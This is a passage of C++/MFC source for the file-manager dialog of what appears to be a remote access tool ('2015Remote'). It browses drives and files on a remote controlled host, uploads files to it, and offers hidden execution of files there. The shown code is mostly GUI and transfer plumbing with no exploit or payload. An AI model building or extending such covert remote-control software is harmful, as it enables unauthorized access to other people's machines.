// FileManagerDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "2015Remote.h"
#include "FileManagerDlg.h"
#include "afxdialogex.h"
#include "EditDialog.h"
#include "FileTransferModeDlg.h"
#include "FileCompress.h"
#include <strsafe.h>

#define MAKEINT64(low, high) ((unsigned __int64)(((DWORD)(low)) | ((unsigned __int64)((DWORD)(high))) << 32))
#define MAX_SEND_BUFFER  8192

static UINT Indicators[] =
{
	ID_SEPARATOR,           
	ID_SEPARATOR,
	IDR_STATUSBAR_PROCESS,
};

// CFileManagerDlg 对话框

IMPLEMENT_DYNAMIC(CFileManagerDlg, CDialog)

CFileManagerDlg::CFileManagerDlg(CWnd* pParent, IOCPServer* IOCPServer, CONTEXT_OBJECT *ContextObject)
	: CDialog(CFileManagerDlg::IDD, pParent)
{
	m_ContextObject = ContextObject;
	m_iocpServer = IOCPServer;
	m_ProgressCtrl = NULL;
	sockaddr_in  ClientAddr = {0};
	int iClientAddrLength = sizeof(sockaddr_in);
	//得到连接被控端的IP
	BOOL bOk = getpeername(ContextObject->sClientSocket,(SOCKADDR*)&ClientAddr, &iClientAddrLength);

	m_strClientIP = bOk != INVALID_SOCKET ? inet_ntoa(ClientAddr.sin_addr) : "";

	memset(m_szClientDiskDriverList, 0, sizeof(m_szClientDiskDriverList));
	int len = ContextObject->InDeCompressedBuffer.GetBufferLength();
	memcpy(m_szClientDiskDriverList, ContextObject->InDeCompressedBuffer.GetBuffer(1), len - 1);

	CoInitialize(0);
	// 加载系统图标列表
	try {
		SHFILEINFO	sfi = {0};
		HIMAGELIST hImageList = (HIMAGELIST)SHGetFileInfo(NULL,0,&sfi,sizeof(SHFILEINFO),SHGFI_LARGEICON | SHGFI_SYSICONINDEX);
		m_ImageList_Large = CImageList::FromHandle(hImageList); //CimageList*	
		ImageList_Destroy(hImageList);
	}catch(...){
		OutputDebugStringA("======> m_ImageList_Large catch an error. \n");
	}
	try{
		SHFILEINFO	sfi = {0};
		HIMAGELIST hImageList = (HIMAGELIST)SHGetFileInfo(NULL,0,&sfi,sizeof(SHFILEINFO),SHGFI_SMALLICON | SHGFI_SYSICONINDEX);
		m_ImageList_Small = CImageList::FromHandle(hImageList);
		ImageList_Destroy(hImageList);
	}catch(...){
		OutputDebugStringA("======> m_ImageList_Small catch an error. \n");
	}

	m_bDragging = FALSE;
	m_bIsStop   = FALSE;
}

CFileManagerDlg::~CFileManagerDlg()
{
	m_Remote_Upload_Job.RemoveAll();
	if (m_ProgressCtrl)
	{
		m_ProgressCtrl->DestroyWindow();
		delete m_ProgressCtrl;
	}
	m_ProgressCtrl = NULL;
	m_ImageList_Large->Detach();
	m_ImageList_Small->Detach();
	
	CoUninitialize();
}

void CFileManagerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST_CLIENT, m_ControlList_Client);
	DDX_Control(pDX, IDC_LIST_SERVER, m_ControlList_Server);
	DDX_Control(pDX, IDC_COMBO_SERVER, m_ComboBox_Server);
	DDX_Control(pDX, IDC_COMBO_CLIENT, m_ComboBox_Client);
	DDX_Control(pDX, IDC_STATIC_FILE_SERVER, m_FileServerBarPos);
	DDX_Control(pDX, IDC_STATIC_FILE_CLIENT, m_FileClientBarPos);
}


BEGIN_MESSAGE_MAP(CFileManagerDlg, CDialog)
	ON_WM_CLOSE()
	ON_NOTIFY(NM_DBLCLK, IDC_LIST_SERVER, &CFileManagerDlg::OnNMDblclkListServer)
	ON_CBN_SELCHANGE(IDC_COMBO_SERVER, &CFileManagerDlg::OnCbnSelchangeComboServer)
	ON_COMMAND(IDT_SERVER_FILE_PREV, &CFileManagerDlg::OnIdtServerPrev)

	ON_COMMAND(IDT_SERVER_FILE_NEW_FOLDER, &CFileManagerDlg::OnIdtServerNewFolder)
	ON_COMMAND(IDT_SERVER_FILE_DELETE, &CFileManagerDlg::OnIdtServerDelete)
	ON_COMMAND(IDT_SERVER_FILE_STOP, &CFileManagerDlg::OnIdtServerStop)

	ON_COMMAND(ID_VIEW_BIG_ICON, &CFileManagerDlg::OnViewBigIcon)
	ON_COMMAND(ID_VIEW_SMALL_ICON, &CFileManagerDlg::OnViewSmallIcon)
	ON_COMMAND(ID_VIEW_DETAIL, &CFileManagerDlg::OnViewDetail)
	ON_COMMAND(ID_VIEW_LIST, &CFileManagerDlg::OnViewList)
	ON_NOTIFY(NM_DBLCLK, IDC_LIST_CLIENT, &CFileManagerDlg::OnNMDblclkListClient)
	ON_NOTIFY(LVN_BEGINDRAG, IDC_LIST_SERVER, &CFileManagerDlg::OnLvnBegindragListServer)
	ON_WM_MOUSEMOVE()
	ON_WM_LBUTTONUP()
	ON_NOTIFY(NM_RCLICK, IDC_LIST_SERVER, &CFileManagerDlg::OnNMRClickListServer)
	ON_COMMAND(ID_OPERATION_SERVER_RUN, &CFileManagerDlg::OnOperationServerRun)
	ON_COMMAND(ID_OPERATION_RENAME, &CFileManagerDlg::OnOperationRename)
	ON_NOTIFY(LVN_ENDLABELEDIT, IDC_LIST_SERVER, &CFileManagerDlg::OnLvnEndlabeleditListServer)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_CLIENT, &CFileManagerDlg::OnNMRClickListClient)
	ON_COMMAND(ID_OPERATION_CLIENT_SHOW_RUN, &CFileManagerDlg::OnOperationClientShowRun)
	ON_COMMAND(ID_OPERATION_CLIENT_HIDE_RUN, &CFileManagerDlg::OnOperationClientHideRun)
	ON_NOTIFY(LVN_ENDLABELEDIT, IDC_LIST_CLIENT, &CFileManagerDlg::OnLvnEndlabeleditListClient)
	ON_COMMAND(ID_OPERATION_COMPRESS, &CFileManagerDlg::OnOperationCompress)
END_MESSAGE_MAP()


// CFileManagerDlg 消息处理程序


VOID CFileManagerDlg::OnIdtServerPrev()    
{
	FixedServerFileList("..");
}


VOID CFileManagerDlg::OnIdtServerNewFolder()    
{
	if (m_Server_File_Path == "")
		return;

	CEditDialog	Dlg(this);
	if (Dlg.DoModal() == IDOK && Dlg.m_EditString.GetLength())
	{
		// 创建多层目录

		CString  strString;
		strString = m_Server_File_Path + Dlg.m_EditString + "\\";
		MakeSureDirectoryPathExists(strString.GetBuffer());  /*c:\Hello\  */
		FixedServerFileList(".");
	}
}

VOID CFileManagerDlg::OnIdtServerStop()
{
	m_bIsStop = TRUE;
}


VOID CFileManagerDlg::OnIdtServerDelete()  //真彩删除目录或者文件
{
	//	m_bIsUpload = true;  //我们可以使用这个Flag进行停止 当前的工作
	CString strString;
	if (m_ControlList_Server.GetSelectedCount() > 1)
		strString.Format("确定要将这 %d 项删除吗?", m_ControlList_Server.GetSelectedCount());
	else
	{
		CString strFileName = m_ControlList_Server.GetItemText(m_ControlList_Server.GetSelectionMark(), 0);

		int iItem = m_ControlList_Server.GetSelectionMark();   //.. fff 1  Hello

		if (iItem==-1)
		{
			return;
		}
		if (m_ControlList_Server.GetItemData(iItem) == 1)
		{
			strString.Format("确实要删除文件夹“%s”并将所有内容删除吗?", strFileName);
		}
		else
		{
			strString.Format("确实要把“%s”删除吗?", strFileName);
		}
	}
	if (::MessageBox(m_hWnd, strString, "确认删除", MB_YESNO|MB_ICONQUESTION) == IDNO)
	{
		return;
	}

	EnableControl(FALSE);

	POSITION Pos = m_ControlList_Server.GetFirstSelectedItemPosition();
	while(Pos)
	{
		int iItem = m_ControlList_Server.GetNextSelectedItem(Pos);
		CString	strFileFullPath = m_Server_File_Path + m_ControlList_Server.GetItemText(iItem, 0);
		// 如果是目录
		if (m_ControlList_Server.GetItemData(iItem))
		{
			strFileFullPath += '\\';
			DeleteDirectory(strFileFullPath); 
		}  
		else
		{
			DeleteFile(strFileFullPath);
		}
	} 
	// 禁用文件管理窗口
	EnableControl(TRUE);

	FixedServerFileList(".");
}


BOOL CFileManagerDlg::DeleteDirectory(LPCTSTR strDirectoryFullPath)   
{
	WIN32_FIND_DATA	wfd;
	char	szBuffer[MAX_PATH] = {0};

	wsprintf(szBuffer, "%s\\*.*", strDirectoryFullPath);

	HANDLE hFind = FindFirstFile(szBuffer, &wfd);
	if (hFind == INVALID_HANDLE_VALUE) // 如果没有找到或查找失败
		return FALSE;

	do
	{
		if (wfd.cFileName[0] != '.')
		{
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				char szv1[MAX_PATH];
				wsprintf(szv1, "%s\\%s", strDirectoryFullPath, wfd.cFileName);
				DeleteDirectory(szv1);
			}
			else
			{
				char szv2[MAX_PATH];
				wsprintf(szv2, "%s\\%s", strDirectoryFullPath, wfd.cFileName);
				DeleteFile(szv2);
			}
		}
	} while (FindNextFile(hFind, &wfd));

	FindClose(hFind); // 关闭查找句柄

	if(!RemoveDirectory(strDirectoryFullPath))
	{
		return FALSE;
	}
	return true;
}

BOOL CFileManagerDlg::MakeSureDirectoryPathExists(char* szDirectoryFullPath)   
{
	char* szTravel = NULL;
	char* szBuffer = NULL;
	DWORD dwAttributes;
	__try
	{
		szBuffer = (char*)malloc(sizeof(char)*(strlen(szDirectoryFullPath) + 1));

		if(szBuffer == NULL)
		{
			return FALSE;
		}

		strcpy(szBuffer, szDirectoryFullPath);

		szTravel = szBuffer;

		if (0)
		{
		}
		else if(*(szTravel+1) == ':') 
		{
			szTravel++;
			szTravel++;
			if(*szTravel && (*szTravel == '\\'))
			{
				szTravel++;
			}
		}

		while(*szTravel)           //\Hello\World\Shit\0
		{
			if(*szTravel == '\\')
			{
				*szTravel = '\0';
				dwAttributes = GetFileAttributes(szBuffer);   //查看是否是否目录  目录存在吗
				if(dwAttributes == 0xffffffff)
				{
					if(!CreateDirectory(szBuffer, NULL))
					{
						if(GetLastError() != ERROR_ALREADY_EXISTS)
						{
							free(szBuffer);
							return FALSE;
						}
					}
				}
				else
				{
					if((dwAttributes & FILE_ATTRIBUTE_DIRECTORY) != FILE_ATTRIBUTE_DIRECTORY)
					{
						free(szBuffer);
						szBuffer = NULL;
						return FALSE;
					}
				}

				*szTravel = '\\';
			}

			szTravel = CharNext(szTravel);
		}
	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		if (szBuffer!=NULL)
		{
			free(szBuffer);

			szBuffer = NULL;
		}

		return FALSE;
	}

	if (szBuffer!=NULL)
	{
		free(szBuffer);
		szBuffer = NULL;
	}
	return TRUE;
}

BOOL CFileManagerDlg::PreTranslateMessage(MSG* pMsg)
{
	return CDialog::PreTranslateMessage(pMsg);
}


void CFileManagerDlg::OnClose()
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	m_ContextObject->v1 = 0;
	CancelIo((HANDLE)m_ContextObject->sClientSocket);
	closesocket(m_ContextObject->sClientSocket);
	CDialog::OnClose();
	//delete this; // 释放内存是应该的，但这造成第2次打开文件管理窗口时崩溃
}

BOOL CFileManagerDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	CString strString;
	strString.Format("%s - 远程文件控制", m_strClientIP);
	SetWindowText(strString);

	if (!m_ToolBar_File_Server.Create(this, WS_CHILD |
		WS_VISIBLE | CBRS_ALIGN_ANY | CBRS_TOOLTIPS | CBRS_FLYBY, IDR_TOOLBAR_FILE_SERVER) 
		||!m_ToolBar_File_Server.LoadToolBar(IDR_TOOLBAR_FILE_SERVER))
	{

		return -1;
	}
	//	m_ToolBar_File_Server.ModifyStyle(0, TBSTYLE_FLAT);    //Fix for WinXP
	m_ToolBar_File_Server.LoadTrueColorToolBar
		(
		24,    //加载真彩工具条 
		IDB_BITMAP_FILE,
		IDB_BITMAP_FILE,
		IDB_BITMAP_FILE    //没有用
		);

	m_ToolBar_File_Server.AddDropDownButton(this,IDT_SERVER_FILE_VIEW ,IDR_MENU_FILE_SERVER);

	m_ToolBar_File_Server.SetButtonText(0,"返回");     //在位图的下面添加文件
	m_ToolBar_File_Server.SetButtonText(1,"查看"); 
	m_ToolBar_File_Server.SetButtonText(2,"删除"); 
	m_ToolBar_File_Server.SetButtonText(3,"新建"); 
	m_ToolBar_File_Server.SetButtonText(5,"停止"); 
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST,AFX_IDW_CONTROLBAR_LAST,0);  //显示

	RECT	RectServer;
	m_FileServerBarPos.GetWindowRect(&RectServer);

	m_FileServerBarPos.ShowWindow(SW_HIDE);
	//显示工具栏

	m_ToolBar_File_Server.MoveWindow(&RectServer);

	m_ControlList_Server.SetImageList(m_ImageList_Large, LVSIL_NORMAL);
	m_ControlList_Server.SetImageList(m_ImageList_Small, LVSIL_SMALL);

	m_ControlList_Client.SetImageList(m_ImageList_Large, LVSIL_NORMAL);
	m_ControlList_Client.SetImageList(m_ImageList_Small, LVSIL_SMALL);

	if (!m_StatusBar.Create(this) ||
		!m_StatusBar.SetIndicators(Indicators,
		sizeof(Indicators)/sizeof(UINT)))
	{
		return -1;      
	}

	m_StatusBar.SetPaneInfo(0, m_StatusBar.GetItemID(0), SBPS_STRETCH, NULL);
	m_StatusBar.SetPaneInfo(1, m_StatusBar.GetItemID(1), SBPS_NORMAL, 120);
	m_StatusBar.SetPaneInfo(2, m_StatusBar.GetItemID(2), SBPS_NORMAL, 50);
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); //显示状态栏

	RECT	ClientRect;
	GetClientRect(&ClientRect);

	CRect Rect;
	Rect.top=ClientRect.bottom-25;
	Rect.left=0;
	Rect.right=ClientRect.right;
	Rect.bottom=ClientRect.bottom;

	m_StatusBar.MoveWindow(Rect);

	m_StatusBar.GetItemRect(1, &ClientRect);

	ClientRect.bottom -= 1;

	m_ProgressCtrl = new CProgressCtrl;
	m_ProgressCtrl->Create(PBS_SMOOTH | WS_VISIBLE, ClientRect, &m_StatusBar, 1);
	m_ProgressCtrl->SetRange(0, 100);           //设置进度条范围
	m_ProgressCtrl->SetPos(0);                  //设置进度条当前位置

	FixedServerDiskDriverList();
	FixedClientDiskDriverList();

	return TRUE;  // return TRUE unless you set the focus to a control
	// 异常: OCX 属性页应返回 FALSE
}


VOID CFileManagerDlg::FixedServerDiskDriverList()
{
	CHAR	*Travel = NULL;
	m_ControlList_Server.DeleteAllItems();
	while(m_ControlList_Server.DeleteColumn(0) != 0);
	//初始化列表信息
	m_ControlList_Server.InsertColumn(0, "名称",  LVCFMT_LEFT, 70);
	m_ControlList_Server.InsertColumn(1, "类型", LVCFMT_RIGHT, 85);
	m_ControlList_Server.InsertColumn(2, "总大小", LVCFMT_RIGHT, 80);
	m_ControlList_Server.InsertColumn(3, "可用空间", LVCFMT_RIGHT, 90);

	m_ControlList_Server.SetExtendedStyle(LVS_EX_FULLROWSELECT);

	GetLogicalDriveStrings(sizeof(m_szServerDiskDriverList),(LPSTR)m_szServerDiskDriverList);  //c:\.d:\.
	Travel = m_szServerDiskDriverList;

	CHAR	szFileSystem[MAX_PATH];  //ntfs  fat32
	unsigned __int64	ulHardDiskAmount = 0;   //HardDisk
	unsigned __int64	ulHardDiskFreeSpace = 0;
	unsigned long		ulHardDiskAmountMB = 0; // 总大小
	unsigned long		ulHardDiskFreeMB = 0;   // 剩余空间

	for (int i = 0; *Travel != '\0'; i++, Travel += lstrlen(Travel) + 1)
	{
		// 得到磁盘相关信息
		memset(szFileSystem, 0, sizeof(szFileSystem));
		// 得到文件系统信息及大小
		GetVolumeInformation(Travel, NULL, 0, NULL, NULL, NULL, szFileSystem, MAX_PATH);

		ULONG	ulFileSystemLength = lstrlen(szFileSystem) + 1;    
		if (GetDiskFreeSpaceEx(Travel, (PULARGE_INTEGER)&ulHardDiskFreeSpace, (PULARGE_INTEGER)&ulHardDiskAmount, NULL))
		{	
			ulHardDiskAmountMB = ulHardDiskAmount / 1024 / 1024;
			ulHardDiskFreeMB = ulHardDiskFreeSpace / 1024 / 1024;
		}
		else
		{
			ulHardDiskAmountMB = 0;
			ulHardDiskFreeMB = 0;
		}

		int	iItem = m_ControlList_Server.InsertItem(i, Travel,GetServerIconIndex(Travel,GetFileAttributes(Travel)));    //获得系统的图标

		m_ControlList_Server.SetItemData(iItem, 1);

		SHFILEINFO	sfi;
		SHGetFileInfo(Travel, FILE_ATTRIBUTE_NORMAL, &sfi,sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);
		m_ControlList_Server.SetItemText(iItem, 1, sfi.szTypeName);

		CString	strCount;
		strCount.Format("%10.1f GB", (float)ulHardDiskAmountMB / 1024);
		m_ControlList_Server.SetItemText(iItem, 2, strCount);
		strCount.Format("%10.1f GB", (float)ulHardDiskFreeMB / 1024);
		m_ControlList_Server.SetItemText(iItem, 3, strCount);
	}
}

VOID CFileManagerDlg::FixedClientDiskDriverList()
{
	m_ControlList_Client.DeleteAllItems();

	m_ControlList_Client.InsertColumn(0, "名称",  LVCFMT_LEFT, 70);
	m_ControlList_Client.InsertColumn(1, "类型", LVCFMT_RIGHT, 85);
	m_ControlList_Client.InsertColumn(2, "总大小", LVCFMT_RIGHT, 80);
	m_ControlList_Client.InsertColumn(3, "可用空间", LVCFMT_RIGHT, 90);

	m_ControlList_Client.SetExtendedStyle(LVS_EX_FULLROWSELECT);

	char	*Travel = NULL;
	Travel = (char *)m_szClientDiskDriverList;   //已经去掉了消息头的1个字节了

	int i = 0;
	ULONG ulIconIndex = 0;
	for (i = 0; Travel[i] != '\0';)
	{
		//由驱动器名判断图标的索引
		if (Travel[i] == 'A' || Travel[i] == 'B')
		{
			ulIconIndex = 6;
		}
		else
		{
			switch (Travel[i + 1])   //这里是判断驱动类型 查看被控端
			{
			case DRIVE_REMOVABLE:
				ulIconIndex = 2+5;
				break;
			case DRIVE_FIXED:
				ulIconIndex = 3+5;
				break;
			case DRIVE_REMOTE:
				ulIconIndex = 4+5;
				break;
			case DRIVE_CDROM:
				ulIconIndex = 9;	//Win7为10
				break;
			default:
				ulIconIndex = 0;
				break;		
			}
		}
		//		02E3F844  43 03 04 58 02 00 73 D7 00 00 B1 BE B5 D8 B4 C5 C5 CC 00 4E 54 46 53 00 44  C..X..s...本地磁盘.NTFS.D
		//		2E3F85E  03 04 20 03 00 FC 5B 00 00 B1 BE B5 D8 B4 C5 C5 CC 00 4E 54 46 53 00

		CString	strVolume;
		strVolume.Format("%c:\\", Travel[i]);//c:
		int	iItem = m_ControlList_Client.InsertItem(i, strVolume,ulIconIndex);
		m_ControlList_Client.SetItemData(iItem, 1);     //不显示  

		unsigned long		ulHardDiskAmountMB = 0; // 总大小
		unsigned long		ulHardDiskFreeMB = 0;   // 剩余空间
		memcpy(&ulHardDiskAmountMB, Travel + i + 2, 4);
		memcpy(&ulHardDiskFreeMB, Travel + i + 6, 4);
		CString  strCount;
		strCount.Format("%10.1f GB", (float)ulHardDiskAmountMB / 1024);
		m_ControlList_Client.SetItemText(iItem, 2, strCount);
		strCount.Format("%10.1f GB", (float)ulHardDiskFreeMB / 1024);
		m_ControlList_Client.SetItemText(iItem, 3, strCount);

		i += 10;   //10 

		CString  strTypeName;
		strTypeName = Travel + i;
		m_ControlList_Client.SetItemText(iItem, 1, strTypeName);
		i += strlen(Travel + i) + 1;
		i += strlen(Travel + i) + 1;
	}
}

void CFileManagerDlg::OnNMDblclkListServer(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码

	if (m_ControlList_Server.GetSelectedCount() == 0 || m_ControlList_Server.GetItemData(m_ControlList_Server.GetSelectionMark()) != 1)
		return;

	FixedServerFileList();
	*pResult = 0;
}

VOID CFileManagerDlg::FixedServerFileList(CString strDirectory)  
{
	if (strDirectory.GetLength() == 0)
	{
		int	iItem = m_ControlList_Server.GetSelectionMark();

		// 如果有选中的，是目录
		if (iItem != -1)
		{
			if (m_ControlList_Server.GetItemData(iItem) == 1)   //设置隐藏数据
			{
				strDirectory = m_ControlList_Server.GetItemText(iItem, 0);   
			}
		}
		// 从组合框里得到路径
		else
		{
			m_ComboBox_Server.GetWindowText(m_Server_File_Path);  
		}
	}

	if (strDirectory == "..")  
	{
		m_Server_File_Path = GetParentDirectory(m_Server_File_Path);
	}
	// 刷新当前用
	else if (strDirectory != ".")   //c:\  1
	{	
		/*  c:\   */
		m_Server_File_Path += strDirectory;     
		if(m_Server_File_Path.Right(1) != "\\")
		{
			m_Server_File_Path += "\\";    
		}
	}

	// 是驱动器的根目录,返回磁盘列表
	if (m_Server_File_Path.GetLength() == 0)
	{
		FixedServerDiskDriverList();
		return;
	}

	m_ComboBox_Server.InsertString(0, m_Server_File_Path);  
	m_ComboBox_Server.SetCurSel(0);

	m_ControlList_Server.DeleteAllItems();
	while(m_ControlList_Server.DeleteColumn(0) != 0);  //删除
	m_ControlList_Server.InsertColumn(0, "名称",  LVCFMT_LEFT, 200);
	m_ControlList_Server.InsertColumn(1, "大小", LVCFMT_LEFT, 100);
	m_ControlList_Server.InsertColumn(2, "类型", LVCFMT_LEFT, 100);
	m_ControlList_Server.InsertColumn(3, "修改日期", LVCFMT_LEFT, 115);

	int			iItemIndex = 0;
	m_ControlList_Server.SetItemData(m_ControlList_Server.InsertItem(iItemIndex++, "..", 
		GetServerIconIndex(NULL, FILE_ATTRIBUTE_DIRECTORY)),1);

	// i 为 0 时列目录，i 为 1时列文件
	for (int i = 0; i < 2; i++)
	{
		CFileFind	FindFile;
		BOOL		bContinue;
		bContinue = FindFile.FindFile(m_Server_File_Path + "*.*");   //c:\*.*      //.. .  1.txt
		while (bContinue)
		{	
			bContinue = FindFile.FindNextFile();
			if (FindFile.IsDots())	   // .
				continue;
			BOOL bIsInsert = !FindFile.IsDirectory() == i;

			if (!bIsInsert)
				continue;

			int iItem = m_ControlList_Server.InsertItem(iItemIndex++, FindFile.GetFileName(), 
				GetServerIconIndex(FindFile.GetFileName(), GetFileAttributes(FindFile.GetFilePath())));
			m_ControlList_Server.SetItemData(iItem,	FindFile.IsDirectory());
			SHFILEINFO	sfi;
			SHGetFileInfo(FindFile.GetFileName(), FILE_ATTRIBUTE_NORMAL, &sfi,sizeof(SHFILEINFO), 
				SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES); 

			if (FindFile.IsDirectory())
			{
				m_ControlList_Server.SetItemText(iItem, 2, "文件夹");
			}

			else
			{
				m_ControlList_Server.SetItemText(iItem,2, sfi.szTypeName);
			}

			CString strFileLength;  
			strFileLength.Format("%10d KB", FindFile.GetLength() / 1024 + (FindFile.GetLength() % 1024 ? 1 : 0));
			m_ControlList_Server.SetItemText(iItem, 1, strFileLength);
			CTime Time;
			FindFile.GetLastWriteTime(Time);
			m_ControlList_Server.SetItemText(iItem, 3, Time.Format("%Y-%m-%d %H:%M"));
		}
	}
}

void CFileManagerDlg::OnCbnSelchangeComboServer()
{
	int iIndex = m_ComboBox_Server.GetCurSel();
	CString  strString;
	m_ComboBox_Server.GetLBText(iIndex,strString);

	m_ComboBox_Server.SetWindowText(strString);

	FixedServerFileList();
}

void CFileManagerDlg::OnViewBigIcon()
{
	// TODO: 在此添加命令处理程序代码
	m_ControlList_Server.ModifyStyle(LVS_TYPEMASK, LVS_ICON);	
}


void CFileManagerDlg::OnViewSmallIcon()
{
	// TODO: 在此添加命令处理程序代码
	m_ControlList_Server.ModifyStyle(LVS_TYPEMASK, LVS_SMALLICON);
}

void CFileManagerDlg::OnViewDetail()
{
	m_ControlList_Server.ModifyStyle(LVS_TYPEMASK, LVS_REPORT);	
}

void CFileManagerDlg::OnViewList()
{
	m_ControlList_Server.ModifyStyle(LVS_TYPEMASK, LVS_LIST);	
}

void CFileManagerDlg::OnNMDblclkListClient(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);

	if (m_ControlList_Client.GetSelectedCount() == 0 || m_ControlList_Client.GetItemData(m_ControlList_Client.GetSelectionMark()) != 1)
	{
		return;
	}

	GetClientFileList();  //发消息
	*pResult = 0;
}


VOID CFileManagerDlg::GetClientFileList(CString strDirectory)   
{
	if (strDirectory.GetLength() == 0)   //磁盘卷
	{
		int	iItem = m_ControlList_Client.GetSelectionMark();

		// 如果有选中的，是目录
		if (iItem != -1)
		{
			if (m_ControlList_Client.GetItemData(iItem) == 1)             
			{
				strDirectory = m_ControlList_Client.GetItemText(iItem, 0);    /* D:\ */
			}
		}
	}

	else if (strDirectory != ".")
	{	
		m_Client_File_Path += strDirectory;
		if(m_Client_File_Path.Right(1) != "\\")
		{
			m_Client_File_Path += "\\";    
		}
	}

	if (m_Client_File_Path.GetLength() == 0)
	{
		//	FixedRemoteDriveList();
		return;
	}

	ULONG	ulLength = m_Client_File_Path.GetLength() + 2;
	BYTE	*szBuffer = (BYTE *)new BYTE[ulLength];
	//将COMMAND_LIST_FILES  发送到控制端，到控制搜索
	szBuffer[0] = COMMAND_LIST_FILES;
	memcpy(szBuffer + 1, m_Client_File_Path.GetBuffer(0), ulLength - 1);
	m_iocpServer->OnClientPreSending(m_ContextObject, szBuffer, ulLength);
	delete[] szBuffer;
	szBuffer = NULL;

	//	m_Remote_Directory_ComboBox.InsertString(0, m_Remote_Path);
	//	m_Remote_Directory_ComboBox.SetCurSel(0);

	// 得到返回数据前禁窗口
	m_ControlList_Client.EnableWindow(FALSE);
	m_ProgressCtrl->SetPos(0);
}

VOID CFileManagerDlg::OnReceiveComplete()
{
	if (m_ContextObject==NULL)
	{
		return;
	}

	switch(m_ContextObject->InDeCompressedBuffer.GetBuffer()[0])
	{
	case TOKEN_FILE_LIST:
		{
			FixedClientFileList(m_ContextObject->InDeCompressedBuffer.GetBuffer(),
				m_ContextObject->InDeCompressedBuffer.GetBufferLength() - 1);
			break;
		}

	case TOKEN_DATA_CONTINUE:
		{

			SendFileData();

			break;
		}
	case TOKEN_GET_TRANSFER_MODE:            
		{
			SendTransferMode();
			break;
		}
	}
}


VOID CFileManagerDlg::SendTransferMode() //如果主控端发送的文件在被控端上存在提示如何处理  
{
	CFileTransferModeDlg	Dlg(this);
	Dlg.m_strFileName = m_strDestFileFullPath;
	switch (Dlg.DoModal())
	{
	case IDC_OVERWRITE:
		m_ulTransferMode = TRANSFER_MODE_OVERWRITE;
		break;
	case IDC_OVERWRITE_ALL:
		m_ulTransferMode = TRANSFER_MODE_OVERWRITE_ALL;
		break;
	case IDC_JUMP:
		m_ulTransferMode = TRANSFER_MODE_JUMP;
		break;
	case IDC_JUMP_ALL:
		m_ulTransferMode = TRANSFER_MODE_JUMP_ALL;
		break;
	case IDCANCEL:
		m_ulTransferMode = TRANSFER_MODE_CANCEL;
		break;
	}
	if (m_ulTransferMode == TRANSFER_MODE_CANCEL)
	{
		//		m_bIsStop = true;
		EndCopyServerToClient();
		return;
	}

	BYTE bToken[5];
	bToken[0] = COMMAND_SET_TRANSFER_MODE;
	memcpy(bToken + 1, &m_ulTransferMode, sizeof(m_ulTransferMode));
	m_iocpServer->OnClientPreSending(m_ContextObject, (unsigned char *)&bToken, sizeof(bToken));
}

VOID CFileManagerDlg::SendFileData()
{
	FILE_SIZE *FileSize = (FILE_SIZE *)(m_ContextObject->InDeCompressedBuffer.GetBuffer(1));
	LONG	dwOffsetHigh = FileSize->dwSizeHigh ;  //0
	LONG	dwOffsetLow = FileSize->dwSizeLow;     //0

	m_ulCounter = MAKEINT64(FileSize->dwSizeLow, FileSize->dwSizeHigh);   //0

	ShowProgress(); //通知进度条

	if (m_ulCounter == m_OperatingFileLength||m_bIsStop)
	{
		EndCopyServerToClient(); //进行下个任务的传送如果存在
		return;
	}

	HANDLE	hFile;
	hFile = CreateFile(m_strSourFileFullPath.GetBuffer(0), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return;
	}

	SetFilePointer(hFile, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);   //8192    4G  300

	int		iHeadLength = 9; // 1 + 4 + 4  数据包头部大小，为固定的9

	DWORD	dwNumberOfBytesToRead = MAX_SEND_BUFFER - iHeadLength;
	DWORD	dwNumberOfBytesRead = 0;
	BYTE	*szBuffer = (BYTE *)LocalAlloc(LPTR, MAX_SEND_BUFFER);

	if (szBuffer==NULL)
	{
		CloseHandle(hFile);
		return;
	}

	szBuffer[0] = COMMAND_FILE_DATA; 

	memcpy(szBuffer + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
	memcpy(szBuffer + 5, &dwOffsetLow, sizeof(dwOffsetLow));	  //flag  0000 00 40 20     20    

	ReadFile(hFile, szBuffer + iHeadLength, dwNumberOfBytesToRead, &dwNumberOfBytesRead, NULL);
	CloseHandle(hFile);

	if (dwNumberOfBytesRead > 0)
	{
		ULONG	ulLength = dwNumberOfBytesRead + iHeadLength;
		m_iocpServer->OnClientPreSending(m_ContextObject, szBuffer, ulLength);
	}
	LocalFree(szBuffer);
}

VOID CFileManagerDlg::FixedClientFileList(BYTE *szBuffer, ULONG ulLength)
{
	// 重建标题
	m_ControlList_Client.DeleteAllItems();
	while(m_ControlList_Client.DeleteColumn(0) != 0);
	m_ControlList_Client.InsertColumn(0, "名称",  LVCFMT_LEFT, 200);
	m_ControlList_Client.InsertColumn(1, "大小", LVCFMT_LEFT, 100);
	m_ControlList_Client.InsertColumn(2, "类型", LVCFMT_LEFT, 100);
	m_ControlList_Client.InsertColumn(3, "修改日期", LVCFMT_LEFT, 115);

	int	iItemIndex = 0;
	m_ControlList_Client.SetItemData(m_ControlList_Client.InsertItem(iItemIndex++, "..", GetServerIconIndex(NULL, FILE_ATTRIBUTE_DIRECTORY)),1);
	/*
	ListView 消除闪烁
	更新数据前用SetRedraw(FALSE)   
	更新后调用SetRedraw(TRUE)
	*/
